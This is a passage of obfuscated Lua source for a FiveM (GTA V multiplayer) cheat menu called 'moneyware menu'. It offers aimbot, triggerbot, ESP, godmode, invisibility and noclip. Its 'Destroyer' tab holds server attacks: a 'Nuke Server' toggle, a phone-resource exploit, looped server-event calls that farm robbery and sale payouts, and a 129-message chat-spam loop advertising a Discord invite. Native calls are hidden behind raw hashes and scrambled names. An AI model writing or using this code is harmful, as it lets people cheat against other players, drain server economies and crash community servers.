            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()) , rcolour, gcolour, bcolour)
    end

if Button('Clean Vehicle', 0.434, 0.54, false) then
   SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId(), false), 1.0)
end
if Button('Flip Vehicle', 0.434, 0.56, false) then
SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId(-1)))
end
if Button('Change Plate License', 0.434, 0.58, false) then
     local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                    local playerPed = GetPlayerPed(-1)
                    local playerVeh = GetVehiclePedIsIn(playerPed, true)
                    local result = KeyBoardInput("Enter the plate license you want", "", 10)

            SetVehicleNumberPlateText(playerVeh, result)
    
    end
    if Button('Repair Vehicle', 0.434, 0.6, false) then
    Invoken(
    0x115722B1B9C14C1C,
    Invoken(0x9A9112A0FE9A4713, Invoken(0x43A66C31C68491C0, -1), false)
    )
    Invoken(
    0x79D3B596FE44EE8B,
    Invoken(0x9A9112A0FE9A4713, Invoken(0x43A66C31C68491C0, -1), false),
    0.0
    )
    Invoken(
    0x34E710FF01247C5A,
    Invoken(0x9A9112A0FE9A4713, Invoken(0x43A66C31C68491C0, -1), false),
    0
    )
    Invoken(
    0xFB8794444A7D60FB,
    Invoken(0x9A9112A0FE9A4713, Invoken(0x43A66C31C68491C0, -1), false),
    false
    )
    Invoken(
    0x1FD09E7390A74D54,
    Invoken(0x9A9112A0FE9A4713, Invoken(0x43A66C31C68491C0, -1), false),
    0
    )
   end
   if Button('Max Tune Vehicle', 0.434, 0.62, false) then
    local vehicle_dugshisdfg = Invoken(0x6094AD011A2EA87D, Invoken(0xD80958FC74E988A6))
    FullTune(vehicle_dugshisdfg)
    end
    if Button("Max Mechanics", 0.434, 0.64, false) then
    local vehicle_dugshisdfg = Invoken(0x6094AD011A2EA87D, Invoken(0xD80958FC74E988A6))
    FullPerf(vehicle_dugshisdfg)
   end



end
 
   

   if tab == "Aimbot" then

   
   if Checkbox('Aimbot', 0.431, 0.305,  Zbmckxtpq, false) then
    Zbmckxtpq = not Zbmckxtpq
   end
   if Checkbox('Draw FOV', 0.431, 0.325,  Fov, false) then
    Fov = not Fov
   end

   if Checkbox('Triggerbot', 0.431, 0.345,  Triggerbot, false) then
    Triggerbot = not Triggerbot
   end

   SubMenuButton('Set Aimbot FOV', 0.463, 0.365, Sliderson.Sliderki[22])



   end



    if tab == 'Weapons' then

    if Checkbox('Infinite Ammo', 0.431, 0.305,  noreload, false) then
    noreload = not noreload
    end
    if Checkbox('No Reload', 0.431, 0.325,  InfAmmo, false) then
    InfAmmo = not InfAmmo
    end
    if Checkbox('Weapon Damage Modifier', 0.431, 0.345, Modifier, false) then
    Modifier = not Modifier
    end
    SubMenuButton('Damage Modifier', 0.463, 0.365, Sliderson.Sliderki[20])

    if Checkbox('Explosive Ammunation', 0.431, 0.40, Exammo, false) then
    Exammo = not Exammo
    end

    SubMenuButton('Explosive Ammunation Type', 0.463, 0.42, Sliderson.Sliderki[23])

    if Checkbox('Money Ammunation', 0.431, 0.46, TestSplach, false) then
    TestSplach = not TestSplach
    end

    if Button('Give Weapon', 0.434, 0.48, true) then
    local weapon = KeyBoardInput("Type name of weapon e.g WEAPON_PISTOL", "WEAPON_", 100)
            if weapon ~= nil then
            Invoken(0xBF0FD6E56C964FCB, Invoken(0xD80958FC74E988A6), Invoken(0xD24D37CC275948CC, string.upper(weapon)), 1000, false, false)
       end
    end
    if Button('Remove Weapon', 0.434, 0.5, true) then
    local weapon = KeyBoardInput("Type name of weapon, e.g. WEAPON_PISTOL", "WEAPON_", 100)
                if weapon ~= nil then
                Invoken(0x4899CB088EDF59B8, Invoken(0xD80958FC74E988A6), Invoken(0xD24D37CC275948CC, string.upper(weapon)))
        end
    end
    if Button('Give All Weapons', 0.434, 0.52, true) then
    for i = 1, #AllGuns do
                Invoken(0xBF0FD6E56C964FCB, Invoken(0xD80958FC74E988A6), Invoken(0xD24D37CC275948CC, "WEAPON_"..AllGuns[i]), 1000, false, false)
            end
    end
    if Button('Remove All Weapons', 0.434, 0.54, true) then
    for i = 1, #AllGuns do
            Invoken(0x4899CB088EDF59B8, Invoken(0xD80958FC74E988A6), Invoken(0xD24D37CC275948CC, "WEAPON_"..AllGuns[i]))
        end
    end
    if Button('Refill Ammunation', 0.434, 0.56, true) then
     local ammunation = KeyBoardInput("Enter ammo count", "", 255)
     local weapon = GetSelectedPedWeapon(PlayerPedId())
     AddAmmoToPed(PlayerPedId(), GetHashKey(weapon), ammunation)
    end




    if Checkbox('Enable Deafult Crosshair', 0.569, 0.46,  CoolCrosshair, false) then
    CoolCrosshair = not CoolCrosshair
    end

    if Checkbox('Enable Cool Crosshair', 0.569, 0.48,  GoodCrosshair, false) then
    GoodCrosshair = not GoodCrosshair
    end
    
    if Checkbox('Enable Custom Crosshair', 0.569, 0.305,  crosshaircustom, false) then
    crosshaircustom = not crosshaircustom
    end

    if Checkbox('Crosshair Dot', 0.569, 0.325,  dot, false) then
    dot = not dot
    end

    SubMenuButton('Crosshair Distance', 0.6, 0.345, Sliderson.Sliderki[5])
    SubMenuButton('Crosshair Size', 0.6, 0.385 ,Sliderson.Sliderki[6])

    SubMenuButton('Crosshair Thickness', 0.6, 0.425, Sliderson.Sliderki[7])


    end

    if tab == 'Settings' then
    

    if Checkbox('Rainbow Logo', 0.431, 0.305,  RainbowBanner, false) then
    RainbowBanner = not RainbowBanner
    end
    if Checkbox('Rainbow Background', 0.431, 0.325,  rainbowbackground, false) then
    rainbowbackground = not rainbowbackground
    end

    if Checkbox('Custom Mouse Cursor', 0.431, 0.345,  customcursor, false) then
    customcursor = not customcursor
    end

    SubMenuButton('Mouse Cursor Sprite', 0.463, 0.365, Sliderson.Sliderki[19])

    SubMenuButton('Checkbox Font', 0.463, 0.405, Sliderson.Sliderki[21])

    if Button('Turn off menu', 0.434, 0.44, false) then 
        MenuEnabled = false
        end





    SubMenuButton2("Menu Color", 0.6, 0.3, Sliderson.Sliderki[2], Sliderson.Sliderki[2].value, 0 , 0)
    SubMenuButton2("", 0.6, 0.33, Sliderson.Sliderki[3],  0, Sliderson.Sliderki[3].value, 0)
    SubMenuButton2("", 0.6, 0.36, Sliderson.Sliderki[4],  0, 0, Sliderson.Sliderki[4].value)

    DrawRect(0.6, 0.405, 0.076, 0.0235, 0, 0, 0, 255)
    DrawRect(0.6, 0.405, 0.075, 0.022, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)

    SubMenuButton2("Crosshair Color", 0.6, 0.405+0.015+0.01, Sliderson.Sliderki[8]  , Sliderson.Sliderki[8].value, 0 , 0)
    SubMenuButton2("", 0.6, 0.435+0.015+0.01, Sliderson.Sliderki[9]   ,  0, Sliderson.Sliderki[9].value, 0)
    SubMenuButton2("", 0.6, 0.465+0.015+0.01, Sliderson.Sliderki[10]  ,  0, 0, Sliderson.Sliderki[10].value)

    DrawRect(0.6, 0.505+0.02+0.01, 0.076, 0.0235, 0, 0, 0, 255)
    DrawRect(0.6, 0.505+0.02+0.01, 0.075, 0.0235, Sliderson.Sliderki[8].value, Sliderson.Sliderki[9].value, Sliderson.Sliderki[10].value, 255)


    SubMenuButton2("Invisibility Color", 0.6, 0.535+0.02+0.01, Sliderson.Sliderki[16], Sliderson.Sliderki[16].value, 0 , 0)
    SubMenuButton2("", 0.6, 0.565+0.02+0.01, Sliderson.Sliderki[17],  0, Sliderson.Sliderki[17].value, 0)
    SubMenuButton2("", 0.6, 0.595+0.02+0.01, Sliderson.Sliderki[18],  0, 0, Sliderson.Sliderki[18].value)

    DrawRect(0.6, 0.64+0.02+0.01, 0.076, 0.0235, 0, 0, 0, 255)
    DrawRect(0.6, 0.64+0.02+0.01, 0.075, 0.022, Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)

    end

    if tab == 'Visuals' then
         RequestStreamedTextureDict("helicopterhud", true)
          RequestStreamedTextureDict("visualflow", true)
          RequestStreamedTextureDict("trafficcam", true)
  
          
    if ESP_Preview then
        DrawRect(0.74, 0.503 , 0.107, 0.365, 17, 17, 17, 255)
        DrawRect(0.74, 0.502 , 0.108, 0.365, 17, 17, 17, 255)
        DrawRect(0.74, 0.501 , 0.109, 0.365, 17, 17, 17, 255)
        DrawRect(0.74, 0.497 , 0.107, 0.365, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawRect(0.74, 0.498 , 0.108, 0.365, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawRect(0.74, 0.499 , 0.109, 0.365, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawRect(0.74, 0.5 , 0.11, 0.365, 17, 17, 17, 255)
        DrawRect(0.74, 0.5 , 0.102, 0.3529, 27, 27, 27, 255)
        DrawRect(0.74, 0.5 , 0.101, 0.351, 0, 0, 0, 255)
        DrawRect(0.74, 0.5 , 0.1, 0.35, 17, 17, 17, 255)
        DrawSprite("hugeware3","lysy3", 0.74, 0.5, 0.1, 0.31,0.0,255, 255, 255, 255)

        
    end

if box_drawrect then
    DrawRect(0.74, 0.5 , 0.08, 0.32, 0, 0, 0, 70)
end
if box_obramowka then
    DrawRect(0.7, 0.361 , 0.001, 0.04, 255, 255, 255, 255)
    DrawRect(0.78, 0.361 , 0.001, 0.04, 255, 255, 255, 255)

    DrawRect(0.7, 0.638, 0.001, 0.04, 255, 255, 255, 255)
    DrawRect(0.78, 0.638 , 0.001, 0.04, 255, 255, 255, 255)

    DrawRect(0.7115, 0.342 , 0.022, 0.002, 255, 255, 255, 255)

    DrawRect(0.769, 0.342 , 0.022, 0.002, 255, 255, 255, 255)

    DrawRect(0.7115, 0.657 , 0.022, 0.002, 255, 255, 255, 255)

    DrawRect(0.769, 0.657 , 0.022, 0.002, 255, 255, 255, 255)
end
   
    if Checkbox('Enable ESP', 0.433, 0.305,  ESP_Enable, false) then --[[

esp_duhsgiudfgdfg
esplines_IDSUHGIUFDHGUDFHIG
espbox_dsuhfisdugsdfg
espinfo_ihfdsoudgifgdfg
nameabove_duhsgsiudgsdgrdf

        ]]
    ESP_Enable = not ESP_Enable
    end

    if Checkbox('ESP Preview', 0.433, 0.325,  ESP_Preview, false) then
    ESP_Preview = not ESP_Preview
    end

    if Checkbox('ESP Box', 0.433, 0.345,  box_drawrect, false) then
    box_drawrect = not box_drawrect
    end

    if Checkbox('ESP Border', 0.433, 0.365,  obramowka, false) then
    obramowka = not obramowka
    end

    if Button('Full Brightness', 0.434, 0.385, false) then
    StartTransitionTimecycle("int_lesters")
    end

    --[[if Checkbox('Enable Default ESP', 0.569, 0.305,  esp_duhsgiudfgdfg, false) then 
        esp_duhsgiudfgdfg = not esp_duhsgiudfgdfg 
    end
    if Checkbox('ESP Default Names', 0.569, 0.325,  espinfo_ihfdsoudgifgdfg, false) then 
        espinfo_ihfdsoudgifgdfg = not espinfo_ihfdsoudgifgdfg 
    end
    if Checkbox('ESP Default Boxes', 0.569, 0.345,  espbox_dsuhfisdugsdfg, false) then
    espbox_dsuhfisdugsdfg = not espbox_dsuhfisdugsdfg
    end
    if Checkbox('ESP Default Lines', 0.569, 0.365,  esplines_IDSUHGIUFDHGUDFHIG, false) then
    esplines_IDSUHGIUFDHGUDFHIG = not esplines_IDSUHGIUFDHGUDFHIG
    end]]
   
    end

    if tab == 'Self' then

    if Checkbox('Fastrun', 0.433, 0.305,  fastrun, false) then
    fastrun = not fastrun
    end
    SubMenuButton('', 0.463, 0.31, Sliderson.Sliderki[13])

    if Checkbox('Disable Ragdoll', 0.433, 0.345,  NoRagdoll, false) then
    NoRagdoll = not NoRagdoll
    end

    if Checkbox('Remove Fall Damage', 0.433, 0.365,  FallD, false) then
    FallD = not FallD
    end

    if Checkbox('Invisibility', 0.433, 0.385,  Invisibility, false) then
    Invisibility = not Invisibility
    end

    SubMenuButton('Invisibility Alpha', 0.463, 0.405, Sliderson.Sliderki[14])

    if Checkbox('Godmode', 0.433, 0.44,  Godmode, false) then
    Godmode = not Godmode
    end

    if Checkbox('Unlimited Stamina', 0.433, 0.46,  InfStamina, false) then
    InfStamina = not InfStamina
    end

    if Checkbox('Remove Wanted Level', 0.433, 0.48,  NeverWanted, false) then
    NeverWanted = not NeverWanted
    end

    if Checkbox('Super Jump', 0.433, 0.5,  SuperJump, false) then
    SuperJump = not SuperJump
    end

    if Checkbox('Task Jump', 0.433, 0.52,  Task_Jump, false) then
    Task_Jump = not Task_Jump
    end

    SubMenuButton('Task Jump (Hold Space)', 0.463, 0.54, Sliderson.Sliderki[15])

    if Checkbox('Unlimted Combat Roll', 0.433, 0.575,  UnlCombatRoll, false) then
    UnlCombatRoll = not UnlCombatRoll
    end

    if Checkbox('Anti Stungun', 0.433, 0.595,  AntiStun, false) then
    AntiStun = not AntiStun
    end

    if Button('Native Revive', 0.434, 0.615, false) then 
    Revive()
    end
    if Button('Refill Health', 0.434, 0.635, false) then 
    SetEntityHealth(PlayerPedId(), 200)
    end
    if Button('Refill Armour', 0.434, 0.655, false) then 
    SetPedArmour(PlayerPedId(), 200)
    end
    if Button('Suicide', 0.434, 0.675, false) then 
    SetEntityHealth(PlayerPedId(), 0)
    end
    

    --[[if Checkbox('Camera', 0.569, 0.305,  Freecam, false) then
    Freecam = not Freecam
    end
    
    
    if KeyCheckBox('Camera Keybind: ', 0.558, 0.324, freecamkeybind, false) then
    local freecamkeybindo = KeyBoardInput('Camera Keybind', '', 200)
    freecamkeybind = freecamkeybindo
    end

    SubMenuButton1("Camera Speed", 0.5815, 0.345, Sliderson.Sliderki[11], Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value)]]

     if Checkbox('Noclip', 0.569, 0.305,  Noclip, false) then
    Noclip = not Noclip
    end
    
    SubMenuButton1("Noclip Speed", 0.5815, 0.345, Sliderson.Sliderki[12], Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value)

    if KeyCheckBox('Noclip Keybind: ', 0.558,  0.324, NoclipKeybind, false) then
    local NoclipKeybindo = KeyBoardInput('Camera Keybind', '', 200)
    NoclipKeybind = NoclipKeybindo
    end

    


    end

    if tab == 'Destroyer' then

    if Checkbox('Disable Cars', 0.569, 0.305,  DisCars, false) then
    DisCars = not DisCars
    end
    if Checkbox('Disable Guns', 0.569, 0.325,  DisGuns, false) then
    DisGuns = not DisGuns
    end
    if Checkbox('Fuck Up Vehicles', 0.569, 0.345,  PedVehFly, false) then
    PedVehFly = not PedVehFly
    end
    if Checkbox('Fuck Up Players Who Shoot', 0.569, 0.365,  BombShooters, false) then
    BombShooters = not BombShooters
    end
    if Checkbox('Make Vehicles Noisy', 0.569, 0.385,  NoisyCars, false) then
    NoisyCars = not NoisyCars
    end
    if Checkbox('GC Phone Exploit', 0.569, 0.405,  GcPhone, false) then
    GcPhone = not GcPhone
    end

    if Checkbox('Nuke Server', 0.569, 0.425,  ServerCrash, false) then
    ServerCrash = not ServerCrash
    end


    if Checkbox('ESX Vangelico', 0.431, 0.305,  lol, false) then
    lol = not lol
    end
    if Checkbox('ESX Hunger & Thirst', 0.431, 0.325,  lol1, false) then
    lol1 = not lol1
    end
    if Checkbox('ESX Money Wash', 0.431, 0.345,  lol3, false) then
    lol3 = not lol3
    end


    cury = 0.364

    if ResourceCheck("esx_ambulancejob") then
    if Button('ESX Revive', 0.434--[[ (ex) ]], cury, false) then
    TriggerEvent('esx_ambulancejob:revive')
    end
    cury = cury + 0.02
    end 
    

    if ResourceCheck("CarryPeople") then
    if Button('ESX Carry All', 0.434--[[ (ex) ]], cury, false) then
    TriggerEvent('esx_ambulancejob:revive')
    end
    cury = cury + 0.02
    end 


    if ResourceCheck("chat") then
    if Button('ESX Spam Chat', 0.434--[[ (ex) ]], cury, false) then
    for i = 0, 128 do
    ExecuteCommand('moneyware menu | https://discord.gg/tAf4ZwQgAD')
    end
    end
    cury = cury + 0.02
    end 

    if ResourceCheck("esx_vangelico_robbery") then
    if Button('ESX Vangelico Robbery', 0.434--[[ (ex) ]], cury, false) then
    for i = 0, 70 do
    TriggerServerEvent('esx_vangelico_robbery:gioielli')
    end
    end
    cury = cury + 0.02
    end 

    if ResourceCheck("esx_vangelico_robbery") then
    if Button('ESX Lester Vendita', 0.434--[[ (ex) ]], cury, false) then
    for i = 0, 70 do
    TriggerServerEvent('lester:vendita')
    end
    end
    cury = cury + 0.02
    end 

    if ResourceCheck("esx_status") then
    if Button('ESX Hunger & Thirst', 0.434--[[ (ex) ]], cury, false) then
    TriggerEvent("esx_status:set", "hunger", 1000000)
    TriggerEvent("esx_status:set", "thirst", 1000000)
    end
    cury = cury + 0.02
    end 

end -- end for tab


end




local function DisableMovement(bool)
    DisableControlAction(1, 1, bool)
    DisableControlAction(1, 2, bool)
    DisableControlAction(1, 22, bool)
    DisableControlAction(1, 24, bool)
    DisableControlAction(1, 25, bool)
    DisableControlAction(0, 32, bool) -- W
    DisableControlAction(0, 31, bool) -- S
    DisableControlAction(0, 30, bool) -- D
    DisableControlAction(0, 34, bool) -- A
    
end

local function DrawMenu()
    



    local cursor_x, cursor_y = GetNuiCursorPosition() 
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height

   --[[ if dragging_allowed and IsDisabledControlPressed(1, 24) then
        dragging = true
        MW.Menu.MenuX = cursor_x
        MW.Menu.MenuY = cursor_y+0.24
        SetMouseCursorSprite(4)
    else   
        dragging = false
        dragging_allowed = false
    end

    if( (cursor_x) + 0.19 >= MW.Menu.MenuX and (cursor_x) - 0.19 <= MW.Menu.MenuX and (cursor_y) + 0.007 >= MW.Menu.MenuY-0.24 and (cursor_y) - 0.007 <= MW.Menu.MenuY-0.24) then
        if IsDisabledControlPressed(1, 24) and not dragging then
            dragging_allowed = not dragging_allowed
        end

        if not dragging then
            SetMouseCursorSprite(3)
        end
    else
        SetMouseCursorSprite(1)
    end]]
    
    DrawButtons()
    DisableMovement(true)
    
if customcursor then
    local x, y = GetNuiCursorPosition()
    local x_ez, y_ez = GetActiveScreenResolution()
    local cursorX, cursorY = x / x_ez, y / y_ez
    DrawRect(cursorX, cursorY, 0.007, 0.0025, 0, 0, 0, 255)
    DrawRect(cursorX, cursorY, 0.002, 0.0135, 0, 0, 0, 255)
    DrawRect(cursorX, cursorY, 0.006, 0.001, 255, 255, 255, 255)
    DrawRect(cursorX, cursorY, 0.001, 0.012, 255, 255, 255, 255)
else
SetMouseCursorActiveThisFrame()
    SetMouseCursorSprite(Sliderson.Sliderki[19].value)
end

    end 

Citizen.CreateThread(function()
    while MenuEnabled do
        Citizen.Wait(0)
        if IsDisabledControlJustReleased(0, 121) then
            menu_display = not menu_display
        end
        if menu_display then
            DrawMenu()
        end
    end
end)

Citizen.CreateThread(function()
    while MenuEnabled do
        Citizen.Wait(0)

        CSGOHAHAHHA(GetPlayerServerId(PlayerId()), PlayerPedId(), 255, 255, 255, 255)
        
        if Invisibility then
            DrawLine(GetPedBoneCoords(PlayerPedId(), 31086), GetPedBoneCoords(PlayerPedId(), 0x9995),Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value,255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x9995), GetPedBoneCoords(PlayerPedId(), 0xE0FD), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value,255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x5C57), GetPedBoneCoords(PlayerPedId(), 0xE0FD), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value,255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x192A), GetPedBoneCoords(PlayerPedId(), 0xE0FD), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value,255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x3FCF), GetPedBoneCoords(PlayerPedId(),0x192A), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0xCC4D), GetPedBoneCoords(PlayerPedId(), 0x3FCF), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0xB3FE), GetPedBoneCoords(PlayerPedId(), 0x5C57), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0xB3FE), GetPedBoneCoords(PlayerPedId(), 0x3779), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x9995), GetPedBoneCoords(PlayerPedId(), 0xB1C5), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0xB1C5), GetPedBoneCoords(PlayerPedId(), 0xEEEB), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0xEEEB), GetPedBoneCoords(PlayerPedId(), 0x49D9), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)

            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x9995), GetPedBoneCoords(PlayerPedId(), 0x9D4D), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x9D4D), GetPedBoneCoords(PlayerPedId(), 0x6E5C), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)
            DrawLine(GetPedBoneCoords(PlayerPedId(), 0x6E5C), GetPedBoneCoords(PlayerPedId(), 0xDEAD), Sliderson.Sliderki[16].value, Sliderson.Sliderki[17].value, Sliderson.Sliderki[18].value, 255)

            Invoken(0xEA1C610A04DB6BBB, PlayerPedId(), false, false)
            Invoken(0x241E289B5C059EDC, PlayerPedId(), true)
            Invoken(0x44A0870B7E92D7C0, PlayerPedId(), Sliderson.Sliderki[14].value)
            --[[local head = GetPedBoneCoords(PlayerPedId(), 31086)
            DrawMarker(28, head.x, head.y, head.z+0.06, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.1, 0.1, 0.1, 0, 255, 0, 255, false, true, 2, nil, nil, false)]]
        else
            Invoken(0xEA1C610A04DB6BBB, PlayerPedId(), true, true)
            Invoken(0x44A0870B7E92D7C0, PlayerPedId(), 255)
        end

        if InfStamina then
            ResetPlayerStamina(PlayerId())
        end

        if NoRagdoll then
            SetPedCanRagdoll(PlayerPedId(), false)
        end

        if AntiStun then
            SetPedCanRagdollFromPlayerImpact(PlayerPedId(), false)
        end

        if Fov then
          RequestStreamedTextureDict("mpmissmarkers256", true)
          DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5,Sliderson.Sliderki[22].value / 10 / 10,Sliderson.Sliderki[22].value / 10 / 10 * 1.8,0.0,90,90,90,90)
          end
		  
		  --[[if Freecam  then
				if not Displayed then
				local freecam_cam = freecam_cam
				if not freecam_cam ~= nil then
                freecam_cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
				end
                RenderScriptCams(1, 0, 0, 1, 1)
                SetCamActive(freecam_cam, true)
                SetCamCoord(freecam_cam, GetEntityCoords(GetPlayerPed()))
            
                local offsetRotX = 0.0
                local offsetRotY = 0.0
                local offsetRotZ = 0.0
				
				DisableControlAction(0, 32, true) -- Coords
				DisableControlAction(0, 31, true) -- S
				DisableControlAction(0, 30, true) -- D
				DisableControlAction(0, 34, true) -- A
                                    
                local weapondelay = 0

                while DoesCamExist(freecam_cam) do
                    Wait(0)
					local freecam_cam_rot = GetCamRot(freecam_cam, 2)
					local Markerloc = GetCamCoord(freecam_cam) + (RotationToDirection(freecam_cam_rot) * 10)
					local currentmode = modes[tryb]
					FreezeEntityPosition(GetPlayerPed(-1), true)
					local coords = GetCamCoord(freecam_cam)
					local rightVec, forwardVec, upVec = GetCamMatrix(freecam_cam)
					local curVec = vector3(coords.x, coords.y, coords.z)
					local targetVec = curVec + forwardVec * 150
					local handle = StartShapeTestRay(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
					local _, hit, endCoords, _, entity_to_check = GetShapeTestResult(handle)
					local entity = entity
					if CheckEntity(entity_to_check) then
						entity = entity_to_check
					end
					-- Entity Info --
					if DoesEntityExist(entity) and DoesEntityHaveDrawable(entity) then
						local coords = GetEntityCoords(entity)
						local frozen = nil
						if frozen_entities[entity] == nil then
							frozen_entities[entity] = false
						end
						
						frozen_entities[GetPlayerPed()] = true
						
						if entity == object_freecam then
						else
						DrawText3D_MW_UDGUYSDHUGSFFDG(coords.x, coords.y, coords.z, "Model: " .. GetEntityModel(entity) .. "\nPos: " .. ("x: %.2f, y: %.2f, z: %.2f"):format(coords.x, coords.y, coords.z) .. "\nHealth: " .. GetEntityHealth(entity) .. "\nFrozen: "..tostring(frozen_entities[entity]), 255, 255, 255)
						end
					end
					
					-- Crosshair --
					
					if DoesEntityExist(entity) then
						DrawRect(0.5, 0.5, 0.008, 0.001, 0,255,0, 255)
						DrawRect(0.5, 0.5, 0.001, 0.014, 0,255,0, 255)
					else
						DrawRect(0.5, 0.5, 0.008, 0.001, 255,255,255, 255)
						DrawRect(0.5, 0.5, 0.001, 0.014, 255,255,255, 255)
					end
					
					-- Entity dragging --
					if DoesEntityExist(entity) then
						if IsDisabledControlPressed(1, keys["MOUSE1"]) then
							if entity == object_freecam then
							else
								if not dragging then
									lastentity = entity
								end
							end
						end
					end
					
					if DoesEntityExist(lastentity) then
						if IsDisabledControlPressed(1, keys["MOUSE1"]) and not Displayed then
							dragging = true
							SetEntityCoords(lastentity, Markerloc)
							if IsDisabledControlPressed(1, 38) then -- E
								if freecam_entity_dragging_heading == nil then
									freecam_entity_dragging_heading = GetEntityHeading(freecam_entity_dragging_heading)
								end
								freecam_entity_dragging_heading = freecam_entity_dragging_heading + 1 + 0.0
								if freecam_entity_dragging_heading >= 360.0 then
									freecam_entity_dragging_heading = 0.0
								end
							end
								
							if IsDisabledControlPressed(1, 44) then -- Q
								if freecam_entity_dragging_heading == nil then
									freecam_entity_dragging_heading = GetEntityHeading(object_freecam)
								end
								freecam_entity_dragging_heading = freecam_entity_dragging_heading - 1 + 0.0
								if freecam_entity_dragging_heading <= 0.0 then
									freecam_entity_dragging_heading = 360.0
								end
							end
								
							SetEntityRotation(lastentity, freecam_cam_rot)
							BoundingBox(lastentity,0,0,0,100)
							DrawRect(0.5, 0.5, 0.008, 0.001, 0,255,0, 255)
							DrawRect(0.5, 0.5, 0.001, 0.014, 0,255,0, 255)
						else
							if not lastentity == GetPlayerPed() then
								FreezeEntityPosition(lastentity, false)
							end
							BoundingBox(entity,0,0,0,100)
							lastentity = nil
						end
					else
						dragging = false
						if entity == object_freecam then
						else
						BoundingBox(entity,0,0,0,100)
						end
					end
					
					-- Delete entity --
					if DoesEntityExist(entity) then
						if IsDisabledControlJustPressed(1, keys["HOME"]) then
							if entity == GetPlayerPed() then
							--print("You cant delete your self")
							elseif IsPedAPlayer(entity) then
							--print("You cant delete player")
							else
							SetEntityAsMissionEntity(entity, true, true) 
							DeleteVehicle(entity) 
							DeleteEntity(entity) 
							end
						end
					end
					
					-- Freeze entity --
					
					if DoesEntityExist(entity) then
						if IsDisabledControlJustPressed(1, keys["PAGEDOWN"]) then
							if frozen_entities[entity] then
								frozen_entities[entity] = false
								FreezeEntityPosition(entity, false)
							else
								frozen_entities[entity] = true
								FreezeEntityPosition(entity, true)
							end
						end
					end
					
					-- Clone Entity --
					
					if DoesEntityExist(entity) then
						if IsDisabledControlJustPressed(1, keys["C"]) then
							if IsEntityAPed(entity) then
								local clone = CreatePed(4, GetEntityModel(entity), GetEntityCoords(entity), GetEntityHeading(entity), true, true)
								SetEntityRotation(clone, GetEntityRotation(entity, 2))
								frozen_entities[clone] = frozen_entities[entity]
								FreezeEntityPosition(clone, frozen_entities[clone])
								--print("Cloned ped: ~y~" .. entity, "INFO")
							elseif IsEntityAVehicle(entity) then
								local clone = CreateVehicle(GetEntityModel(entity), GetEntityCoords(entity), GetEntityHeading(entity), true, true)
								SetEntityRotation(clone, GetEntityRotation(entity, 2))
								frozen_entities[clone] = frozen_entities[entity]
								FreezeEntityPosition(clone, frozen_entities[clone])
								--print("Cloned vehicle: ~y~" .. entity, "INFO")
							elseif IsEntityAnObject(entity) then
								local clone = CreateObject(GetEntityModel(entity), GetEntityCoords(entity), true, true, true)
								SetEntityRotation(clone, GetEntityRotation(entity, 2))
								frozen_entities[clone] = frozen_entities[entity]
								FreezeEntityPosition(clone, frozen_entities[clone])
								--print("Cloned object: ~y~" .. entity, "INFO")
							end
						end
					end
					
			
						-- Shoot Rocket and other --
					
					if currentmode == "Shoot" then
						if IsDisabledControlJustPressed(1, keys["R"]) then
							RequestWeaponAsset(GetHashKey("WEAPON_RPG")) 
							while not HasWeaponAssetLoaded(GetHashKey("WEAPON_RPG")) do
								Wait(0)
							end
								
							if peds[1] == PlayerPedId() then
								ShootSingleBulletBetweenCoords(GetCamCoord(freecam_cam) + RotationToDirection(freecam_cam_rot), Markerloc, 0.0, false, GetHashKey("WEAPON_RPG"), peds[2], true, false, -1.0)
							else
